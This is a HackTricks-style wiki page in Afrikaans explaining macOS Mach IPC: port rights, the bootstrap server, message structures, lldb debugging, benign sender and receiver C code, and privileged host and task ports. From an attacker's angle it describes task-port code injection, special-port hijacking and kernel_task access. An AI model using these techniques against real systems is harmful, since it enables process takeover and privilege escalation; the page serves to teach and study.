# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basiese inligting

Mach gebruik **tasks** as die **kleinste eenheid** vir die deel van hulpbronne, en elke task kan **veelvuldige threads** bevat. Hierdie **tasks en threads word 1:1 aan POSIX-prosesse en -threads gekoppel**.

Kommunikasie tussen tasks vind plaas via Mach Inter-Process Communication (IPC), wat eenrigtingkommunikasiekanale gebruik. **Messages word tussen ports oorgedra**, wat soortgelyk is aan **message queues** wat deur die kernel bestuur word.

’n **Port** is die **basiese** element van Mach IPC. Dit kan gebruik word om **messages te stuur en te ontvang**.

Elke proses het ’n **IPC table**; daarin is dit moontlik om die **mach ports van die proses** te vind. Die naam van ’n mach port is eintlik ’n getal (’n pointer na die kernel-objek).

’n Proses kan ook ’n port-naam met sekere regte **na ’n ander task stuur**, en die kernel sal hierdie inskrywing in die **IPC table van die ander task** laat verskyn.

### Port Rights

Port rights, wat bepaal watter bewerkings ’n task kan uitvoer, is noodsaaklik vir hierdie kommunikasie. Die moontlike **port rights** is ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, wat dit moontlik maak om messages te ontvang wat na die port gestuur is. Mach ports is MPSC (multiple-producer, single-consumer)-queues, wat beteken dat daar slegs **een receive right vir elke port** in die hele stelsel kan wees (anders as met pipes, waar verskeie prosesse almal file descriptors na die lees-kant van een pipe kan hê).
- ’n **task met die Receive** right kan messages ontvang en **Send rights skep**, wat dit toelaat om messages te stuur. Oorspronklik het slegs die **own task die Receive right oor sy port**.
- As die eienaar van die Receive right **sterf** of dit beëindig, word die **send right nutteloos (dead name).**
- **Send right**, wat dit moontlik maak om messages na die port te stuur.
- Die Send right kan **gekloneer** word, sodat ’n task wat ’n Send right besit die right kan kloon en **aan ’n derde task kan gee**.
- Let daarop dat **port rights** ook deur Mach messages **oorgedra** kan word.
- **Send-once right**, wat dit moontlik maak om een message na die port te stuur en daarna verdwyn.
- Hierdie right kan **nie** **gekloneer** word nie, maar dit kan **verskuif** word.
- **Port set right**, wat ’n _port set_ eerder as ’n enkele port aandui. Deur ’n message uit ’n port set te verwyder, word ’n message uit een van die ports daarin verwyder. Port sets kan gebruik word om gelyktydig op verskeie ports te luister, baie soos `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dead name**, wat nie ’n werklike port right is nie, maar bloot ’n plekhouer. Wanneer ’n port vernietig word, verander alle bestaande port rights na die port in dead names.

**Tasks kan SEND rights aan ander oordra**, sodat hulle messages kan terugstuur. **SEND rights kan ook gekloneer word, sodat ’n task die right kan dupliseer en aan ’n derde task kan gee**. Dit, tesame met ’n tussenproses bekend as die **bootstrap server**, maak effektiewe kommunikasie tussen tasks moontlik.

### File Ports

File ports laat toe dat file descriptors in Mach ports ingekapsuleer word (met behulp van Mach port rights). Dit is moontlik om ’n `fileport` uit ’n gegewe file descriptor te skep met `fileport_makeport`, en om ’n file descriptor uit ’n `fileport` te skep met `fileport_makefd`.

### Establishing a communication

Soos voorheen genoem, is dit moontlik om rights met Mach messages te stuur; jy **kan egter nie ’n right stuur sonder om reeds ’n right te hê** om ’n Mach message te stuur nie. Hoe word die eerste kommunikasie dan gevestig?

Hiervoor is die **bootstrap server** (**launchd** in macOS) betrokke. Aangesien **enigiemand ’n SEND right na die bootstrap server kan kry**, is dit moontlik om dit vir ’n right te vra om ’n message na ’n ander proses te stuur:

1. Task **A** skep ’n **nuwe port** en kry die **RECEIVE right** daaroor.
2. Task **A**, as die houer van die RECEIVE right, **genereer ’n SEND right vir die port**.
3. Task **A** vestig ’n **verbinding** met die **bootstrap server** en **stuur die SEND right** vir die port wat dit aan die begin gegenereer het, aan die server.
- Onthou dat enigiemand ’n SEND right na die bootstrap server kan kry.
4. Task A stuur ’n `bootstrap_register`-message na die bootstrap server om die gegewe port met ’n naam soos `com.apple.taska` **te assosieer**.
5. Task **B** kommunikeer met die **bootstrap server** om ’n bootstrap **lookup vir die diens**-naam (`bootstrap_lookup`) uit te voer. Sodat die bootstrap server kan antwoord, stuur task B aan hom ’n **SEND right na ’n port wat dit voorheen geskep het** binne die lookup-message. As die lookup suksesvol is, **dupliseer die server die SEND right** wat van Task A ontvang is en **stuur dit aan Task B**.
- Onthou dat enigiemand ’n SEND right na die bootstrap server kan kry.
6. Met hierdie SEND right kan **Task B** ’n **message** **na Task A stuur**.
7. Vir tweerigtingkommunikasie genereer task **B** gewoonlik ’n nuwe port met ’n **RECEIVE** right en ’n **SEND** right, en gee die **SEND right aan Task A**, sodat dit messages na TASK B kan stuur (tweerigtingkommunikasie).

Die bootstrap server **kan nie die diensnaam wat deur ’n task opgeëis word, autentiseer nie**. Dit beteken dat ’n **task** moontlik **enige stelseltask kan naboots**, byvoorbeeld deur valslik **’n authorization service-naam op te eis** en dan elke versoek goed te keur.

Apple stoor daarom die **name van stelselverskafde dienste** in veilige konfigurasielêers, wat in **SIP-beskermde** directories geleë is: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Langs elke diensnaam word die **geassosieerde binary ook gestoor**. Die bootstrap server sal ’n **RECEIVE right vir elk van hierdie diensname skep en hou**.

Vir hierdie voorafbepaalde dienste verskil die **lookup-proses effens**. Wanneer ’n diensnaam opgesoek word, begin launchd die diens dinamies. Die nuwe workflow is soos volg:

- Task **B** begin ’n bootstrap **lookup** vir ’n diensnaam.
- **launchd** kontroleer of die task loop en, indien nie, **begin** dit.
- Task **A** (die diens) voer ’n **bootstrap check-in** (`bootstrap_check_in()`) uit. Hier skep die **bootstrap** server ’n SEND right, behou dit en **dra die RECEIVE right aan Task A oor**.
- launchd dupliseer die **SEND right en stuur dit aan Task B**.
- **Task B** genereer ’n nuwe port met ’n **RECEIVE** right en ’n **SEND** right, en gee die **SEND right aan Task A** (die svc), sodat dit messages na TASK B kan stuur (tweerigtingkommunikasie).

Hierdie proses is egter slegs op voorafbepaalde stelseltasks van toepassing. Nie-stelseltasks funksioneer steeds soos oorspronklik beskryf, wat moontlik impersonation kan toelaat.

> [!CAUTION]
> Daarom moet launchd nooit crash nie, anders sal die hele stelsel crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Die `mach_msg`-funksie, wat in wese ’n system call is, word gebruik om Mach messages te stuur en te ontvang. Die funksie vereis dat die message as die eerste argument gestuur word. Hierdie message moet begin met ’n `mach_msg_header_t`-struktuur, gevolg deur die werklike message-inhoud. Die struktuur word soos volg gedefinieer:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prosesse wat oor ’n _**receive right**_ beskik, kan boodskappe op ’n Mach-poort ontvang. Omgekeerd word die **senders** ’n _**send**_ of ’n _**send-once right**_ toegestaan. Die send-once right is uitsluitlik vir die stuur van ’n enkele boodskap; daarna word dit ongeldig.<sup>[[11]](#references)</sup>

Die aanvanklike veld **`msgh_bits`** is ’n bitmap:

- Die eerste bit (mees betekenisvolle) word gebruik om aan te dui dat ’n boodskap kompleks is (meer hieroor hieronder)
- Die 3de en 4de word deur die kernel gebruik
- Die **5 mins betekenisvolle bits van die 2de byte** kan vir **voucher** gebruik word: nog ’n tipe poort om sleutel/waarde-kombinasies te stuur.
- Die **5 mins betekenisvolle bits van die 3de byte** kan vir **local port** gebruik word
- Die **5 mins betekenisvolle bits van die 4de byte** kan vir **remote port** gebruik word

Die tipes wat in die voucher-, local- en remote-poorte gespesifiseer kan word, is (van [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Byvoorbeeld, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kan gebruik word om aan te **dui** dat 'n **send-once**-**reg** vir hierdie poort afgelei en oorgedra moet word. Dit kan ook as `MACH_PORT_NULL` gespesifiseer word om te voorkom dat die ontvanger kan antwoord.

Om maklike **tweerigtingkommunikasie** te bewerkstellig, kan 'n proses 'n **mach port** in die mach-**boodskapkop** spesifiseer, genaamd die _antwoordpoort_ (**`msgh_local_port`**), waarheen die **ontvanger** van die boodskap 'n **antwoord kan stuur**.

> [!TIP]
> Let daarop dat hierdie soort tweerigtingkommunikasie gebruik word in XPC-boodskappe wat 'n antwoord verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep**, soos voorheen verduidelik, om die tweerigtingkommunikasie te skep.

Die ander velde van die boodskapkop is:

- `msgh_size`: die grootte van die volledige pakkie.
- `msgh_remote_port`: die poort waarheen hierdie boodskap gestuur word.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.

> [!CAUTION]
> Let daarop dat **mach-boodskappe oor 'n `mach port` gestuur word**, wat 'n kommunikasiekanaal met **een ontvanger** en **veelvuldige senders** is wat in die mach-kern ingebou is. **Veelvuldige prosesse** kan **boodskappe** na 'n mach-poort **stuur**, maar op enige gegewe tydstip kan slegs **een enkele proses daaruit lees**.

Boodskappe word vervolgens gevorm deur die **`mach_msg_header_t`**-kop, gevolg deur die **liggaam** en die **sleepstuk** (indien enige), en dit kan toestemming verleen om daarop te antwoord. In hierdie gevalle hoef die kern slegs die boodskap van een taak na die ander oor te dra.

'n **Sleepstuk** is **inligting wat deur die kern by die boodskap gevoeg word** (dit kan nie deur die gebruiker gestel word nie) en wat tydens boodskapontvangs aangevra kan word met die vlae `MACH_RCV_TRAILER_<trailer_opt>` (verskillende soorte inligting kan aangevra word).

#### Komplekse boodskappe

Daar is egter ander meer **komplekse** boodskappe, soos dié wat bykomende poortregte oordra of geheue deel, waar die kern hierdie objekte ook na die ontvanger moet stuur. In hierdie gevalle word die mees betekenisvolle bis van die kop, `msgh_bits`, gestel.

Die moontlike descriptors wat oorgedra kan word, word in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) gedefinieer:<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32-bis is al die descriptors 12B groot en is die descriptor-tipe in die 11de een. In 64 bis wissel die groottes.

> [!CAUTION]
> Die kernel sal die descriptors van een task na die ander kopieer, maar eers **'n kopie in kernel memory skep**. Hierdie tegniek, bekend as "Feng Shui", is in verskeie exploits misbruik om die **kernel data in sy memory te laat kopieer** deur 'n process descriptors na homself te laat stuur. Die process kan dan die messages ontvang (die kernel sal hulle vrylaat).
>
> Dit is ook moontlik om **port rights na 'n kwesbare process te stuur**, en die port rights sal eenvoudig in die process verskyn (selfs al hanteer hy hulle nie).

### Mac Ports APIs

Let daarop dat ports met die task namespace geassosieer word. Om 'n port te skep of te soek, word die task namespace dus ook geraadpleeg (meer in `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Skep** 'n port.
- `mach_port_allocate` kan ook 'n **port set** skep: receive right oor 'n groep ports. Wanneer 'n message ontvang word, word die port waarvandaan dit afkomstig is, aangedui.
- `mach_port_allocate_name`: Verander die naam van die port (by verstek 'n 32-bis heelgetal)
- `mach_port_names`: Kry port name van 'n target
- `mach_port_type`: Kry die rights van 'n task oor 'n name
- `mach_port_rename`: Hernoem 'n port (soos dup2 vir FDs)
- `mach_port_allocate`: Ken 'n nuwe RECEIVE, PORT_SET of DEAD_NAME toe
- `mach_port_insert_right`: Skep 'n nuwe right in 'n port waaroor jy RECEIVE het
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Functions wat gebruik word om **mach messages te stuur en te ontvang**. Die overwrite-weergawe laat jou toe om 'n ander buffer vir message-ontvangs te spesifiseer (die ander weergawe sal dit eenvoudig hergebruik).

### Debug mach_msg

Omdat die functions **`mach_msg`** en **`mach_msg_overwrite`** gebruik word om messages te stuur en te ontvang, sal die instelling van 'n breakpoint daarop jou toelaat om die gestuurde en ontvangde messages te inspekteer.

Begin byvoorbeeld om enige application te debug wat jy kan debug, aangesien dit **`libSystem.B` which will use this function** sal laai.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Om die arguments van **`mach_msg`** te kry, kontroleer die registers. Dit is die arguments (uit [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kry die waardes uit die registers:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspekteer die boodskapkop en kontroleer die eerste argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Daardie tipe `mach_msg_bits_t` is baie algemeen om 'n antwoord toe te laat.

### Enumereer poorte
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Die **naam** is die versteknaam wat aan die poort gegee word (let op hoe dit in die eerste 3 grepe **toeneem**). Die **`ipc-object`** is die **verdoeselde** unieke **identifiseerder** van die poort.\
Let ook op hoe die poorte met slegs **`send`**-regte die eienaar daarvan **identifiseer** (poortnaam + pid).\
Let ook op die gebruik van **`+`** om **ander take wat aan dieselfde poort gekoppel is** aan te dui.

Dit is ook moontlik om [**procesxp**](https://www.newosxbook.com/tools/procexp.html) te gebruik om ook die **geregistreerde diensname** te sien (met SIP gedeaktiveer weens die behoefte aan `com.apple.system-task-port`):
```
procesp 1 ports
```
Jy kan hierdie tool in iOS installeer deur dit af te laai vanaf [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Kodevoorbeeld

Let op hoe die **sender** ’n port **allocates**, ’n **send right** vir die naam `org.darlinghq.example` **create** en dit na die **bootstrap server** stuur, terwyl die sender die **send right** van daardie naam aangevra en dit gebruik het om ’n **message te send**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Bevoorregte poorte

Sommige spesiale poorte laat ’n taak toe om **sekere sensitiewe aksies uit te voer of toegang tot sekere sensitiewe data te verkry** wanneer dit **SEND**-regte daaroor het. Hierdie poorte is vanuit ’n aanvaller se perspektief interessant vanweë beide hul vermoëns en die moontlikheid om **SEND-regte oor take heen te deel**.

### Spesiale gasheerpoorte

Hierdie poorte word deur ’n nommer voorgestel.

**SEND**-regte kan verkry word deur **`host_get_special_port`** aan te roep, en **RECEIVE**-regte deur **`host_set_special_port`** aan te roep. Albei oproepe vereis egter die **`host_priv`**-poort, waartoe slegs root toegang het. In die verlede kon root boonop **`host_set_special_port`** aanroep en arbitrêre poorte kaap, wat byvoorbeeld die omseiling van code signatures moontlik gemaak het deur `HOST_KEXTD_PORT` te kaap (SIP verhoed dit nou).

Dit word in 2 groepe verdeel: Die **eerste 7 poorte word deur die kernel besit**, naamlik 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` en 7 `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Die poorte wat **vanaf** nommer **8** begin, word **deur system daemons besit** en kan verklaar gevind word in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: As ’n proses **SEND**-voorreg oor hierdie poort het, kan dit **inligting** oor die **stelsel** verkry deur sy roetines aan te roep, soos:
- `host_processor_info`: Kry verwerkerinligting
- `host_info`: Kry gasheerinligting
- `host_virtual_physical_table_info`: Virtuele/fisiese bladsytabel (vereis MACH_VMDEBUG)
- `host_statistics`: Kry gasheerstatistieke
- `mach_memory_info`: Kry die kernel-geheue-uitleg
- **Host Priv port**: ’n Proses met **SEND**-regte oor hierdie poort kan **bevoorregte aksies** uitvoer, soos om selflaaidata te vertoon of te probeer om ’n kernel extension te laai. Die **proses moet root wees** om hierdie toestemming te verkry.
- Om die **`kext_request`** API aan te roep, is dit boonop nodig om ander entitlements te hê, naamlik **`com.apple.private.kext*`**, wat slegs aan Apple-binaries toegeken word.
- Ander roetines wat aangeroep kan word, is:
- `host_get_boot_info`: Kry `machine_boot_info()`
- `host_priv_statistics`: Kry bevoorregte statistieke
- `vm_allocate_cpm`: Ken Contiguous Physical Memory toe
- `host_processors`: Stuur SEND-regte na gasheerprosessors
- `mach_vm_wire`: Maak geheue resident
- Omdat **root** toegang tot hierdie toestemming het, kan dit `host_set_[special/exception]_port[s]` aanroep om **spesiale gasheer- of uitsonderingspoorte te kaap**.

Dit is moontlik om **al die spesiale gasheerpoorte te sien** deur die volgende uit te voer:
```bash
procexp all ports | grep "HSP"
```
### Spesiale taakpoorte

Dit is poorte wat vir bekende dienste gereserveer is. Dit is moontlik om hulle te verkry/stel deur `task_[get/set]_special_port` aan te roep. Hulle kan in `task_special_ports.h` gevind word:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Vanaf [hier](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Die poort wat gebruik word om hierdie taak te beheer. Word gebruik om messages te stuur wat die taak beïnvloed. Dit is die poort wat deur **mach_task_self (sien Taakpoorte hieronder)** teruggestuur word.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Die taak se bootstrap-poort. Word gebruik om messages te stuur wat die terugstuur van ander system service-poorte versoek.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Die poort wat gebruik word om inligting oor die omringende host aan te vra. Dit is die poort wat deur **mach_host_self** teruggestuur word.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Die poort wat die bron benoem waaruit hierdie taak sy wired kernel memory verkry.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Die poort wat die bron benoem waaruit hierdie taak sy default memory managed memory verkry.

### Taakpoorte

Oorspronklik het Mach nie "processes" gehad nie, maar "tasks", wat meer soos 'n houer vir threads beskou is. Toe Mach met BSD saamgevoeg is, is **elke task met 'n BSD process gekorreleer**. Daarom het elke BSD process die besonderhede wat dit nodig het om 'n process te wees, en elke Mach task het ook sy interne werking (behalwe die nie-bestaande pid 0, wat die `kernel_task` is).

Daar is twee baie interessante funksies wat hiermee verband hou:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Kry 'n SEND right vir die task-poort van die task wat verband hou met die een wat deur die `pid` gespesifiseer word, en gee dit aan die aangeduide `target_task_port` (wat gewoonlik die caller task is wat `mach_task_self()` gebruik het, maar 'n SEND port oor 'n ander task kan wees.)
- `pid_for_task(task, &pid)`: Gegewe 'n SEND right na 'n task, bepaal aan watter PID hierdie task verwant is.

Om aksies binne die task uit te voer, het die task 'n `SEND` right na homself nodig deur `mach_task_self()` aan te roep (wat die `task_self_trap` (28) gebruik). Met hierdie permission kan 'n task verskeie aksies uitvoer, soos:

- `task_threads`: Kry SEND right oor alle task-poorte van die threads van die task
- `task_info`: Kry inligting oor 'n task
- `task_suspend/resume`: Suspend of resume 'n task
- `task_[get/set]_special_port`
- `thread_create`: Skep 'n thread
- `task_[get/set]_state`: Beheer die task se toestand
- en meer kan gevind word in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Let daarop dat dit met 'n SEND right oor 'n task-poort van 'n **ander task** moontlik is om sulke aksies op 'n ander task uit te voer.

Daarbenewens is die task-poort ook die **`vm_map`**-poort, wat 'n caller toelaat om memory binne 'n task te **lees en te manipuleer** met funksies soos `vm_read()` en `vm_write()`. Dit beteken dat 'n task met SEND rights oor 'n ander task se task-poort **code in daardie task kan inject**.

Onthou dat, omdat die **kernel ook 'n task is**, iemand wat daarin slaag om **SEND permissions** oor die **`kernel_task`** te verkry, die kernel enigiets kan laat uitvoer (jailbreaks).

- Roep `mach_task_self()` aan om **die naam** vir hierdie poort vir die caller task te **verkry**. Hierdie poort word slegs oor **`exec()`** geërf; 'n nuwe task wat met `fork()` geskep word, kry 'n nuwe task-poort (as 'n spesiale geval kry 'n task ook 'n nuwe task-poort ná `exec()`in 'n suid binary). Die enigste manier om 'n task te spawn en sy poort te verkry, is om die ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) uit te voer terwyl `fork()` plaasvind.
